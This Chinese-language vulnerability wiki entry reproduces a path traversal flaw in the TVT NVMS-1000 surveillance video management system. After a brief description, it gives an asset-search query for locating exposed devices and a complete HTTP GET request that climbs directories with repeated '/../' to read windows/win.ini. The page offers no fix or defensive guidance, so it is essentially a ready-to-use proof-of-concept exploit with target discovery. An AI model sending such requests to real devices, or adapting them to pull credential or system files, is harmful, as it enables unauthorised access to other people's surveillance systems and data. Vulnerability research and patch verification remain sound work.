---
title: "TVT数码科技 NVMS-1000 路径遍历漏洞"
date: 2026-10-18 09:15:20
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "TVT数码科技-NVMS"
tags:
  - "TVT数码科技-NVMS"
  - "漏洞复现"
---
## 漏洞描述

TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件

## 漏洞影响

```
TVT NVMS-1000
```

## 网络测绘

```
app="TVT-NVMS-1000"
```

## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162301376.png)发送请求包读取文件

```plain
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162302589.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-NVMS-1000-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
